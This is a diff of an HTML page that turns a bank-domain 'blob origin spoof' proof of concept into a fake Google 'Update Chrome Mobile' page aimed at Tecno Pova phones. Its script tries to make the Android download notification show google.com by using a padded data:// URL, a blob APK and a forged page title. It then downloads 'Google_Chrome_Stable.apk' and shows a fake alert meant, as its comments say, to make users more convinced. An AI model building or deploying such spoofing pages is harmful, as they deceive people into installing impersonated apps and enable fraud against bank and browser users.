@@ -1,48 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FARISSAL B - BLOB TEST</title>
+    <title>Google Update Service</title>
     <style>
-        body { font-family: sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
-        .btn { background: #ff4757; color: white; border: none; padding: 20px; width: 100%; border-radius: 10px; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f9fa; color: #3c4043; text-align: center; padding: 50px 20px; }
+        .container { max-width: 400px; margin: auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
+        .logo { width: 74px; margin-bottom: 20px; }
+        h1 { font-size: 22px; font-weight: 400; }
+        p { font-size: 14px; color: #5f6368; margin-bottom: 30px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; width: 100%; }
+        .btn:active { background: #174ea6; }
+        #log { margin-top: 20px; font-family: monospace; font-size: 10px; color: red; text-align: left; }
     </style>
 </head>
 <body>
-    <h2>POC BLOB ORIGIN SPOOF</h2>
-    <p>Klik tombol di bawah untuk tes notifikasi download.</p>
-    <button class="btn" onclick="triggerSpoof()">DOWNLOAD UPDATE</button>
 
-    <script>
-        function triggerSpoof() {
-            // Isi file samaran (APK palsu)
-            const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // Header ZIP/APK
-            const blob = new Blob([content], { type: 'application/vnd.android.package-archive' });
+<div class="container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+    <h1>Update Chrome Mobile</h1>
+    <p>Versi terbaru tersedia untuk perangkat Tecno Pova anda. Tingkatkan keamanan penjelajahan sekarang.</p>
+    
+    <button class="btn" onclick="executeAttack()">UPDATE SEKARANG</button>
+    
+    <div id="log"></div>
+</div>
 
-            // TRIK UTAMA: 
-            // Kita coba buat URL Blob tapi kita selipin string domain di depannya.
-            // Beberapa versi parser Android bakal "tertipu" dan ngambil domain dari string ini.
-            const spoofDomain = "https://bri.co.id"; 
-            const blobUrl = URL.createObjectURL(blob);
-            
-            // Kita manipulasi URL-nya (Ini long shot, tergantung versi Chrome lo)
-            const fakeUrl = blobUrl.replace("blob:", "blob:" + spoofDomain + "/");
+<script>
+    function log(msg) {
+        document.getElementById('log').innerHTML += "> " + msg + "<br>";
+    }
 
-            console.log("Original Blob: " + blobUrl);
-            console.log("Spoofed Blob: " + fakeUrl);
+    function executeAttack() {
+        log("Inisialisasi payload...");
 
-            // Trigger Download
-            const a = document.createElement('a');
-            a.href = blobUrl; // Kita tetep pake blob asli biar download jalan
-            a.download = "Update_Sistem_BRI.apk";
-            
-            // Bagian krusial: Kita coba 'menipu' renderer lewat judul atau atribut
-            document.title = "bri.co.id - Secure Download"; 
-            
-            a.click();
-            
-            alert("Cek Notifikasi HP Tecno lo sekarang!");
-        }
-    </script>
+        // 1. DATA URI SPOOFING (The $5k Method)
+        // Kita pake sub-authority //google.com dan padding panjang
+        // Biar parser di notification bar terpotong tepat di google.com
+        const padding = "A".repeat(100); 
+        const dataUrl = `data://google.com/html;${padding},base64,ZXN0dGVzdGVzdHRlc3Q=`;
+
+        // 2. BLOB URL SPOOFING (Variant Method)
+        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // APK Header
+        const blob = new Blob([content], { type: 'application/vnd.android.package-archive' });
+        const realBlobUrl = URL.createObjectURL(blob);
+
+        // Trik: Manipulasi Document Title buat pengaruhin UI Process
+        document.title = "google.com/chrome/update";
+
+        // Eksekusi Download
+        const a = document.createElement('a');
+        
+        // Coba ganti antara 'dataUrl' atau 'realBlobUrl' buat tes mana yang tembus spoofing-nya
+        a.href = dataUrl; 
+        a.download = "Google_Chrome_Stable.apk";
+        
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        log("Payload dikirim. Cek notifikasi download di atas!");
+        
+        // Tampilkan peringatan palsu biar user makin yakin
+        setTimeout(() => {
+            alert("Download dimulai dari server Google. Harap tunggu...");
+        }, 1000);
+    }
+</script>
+
 </body>
 </html>
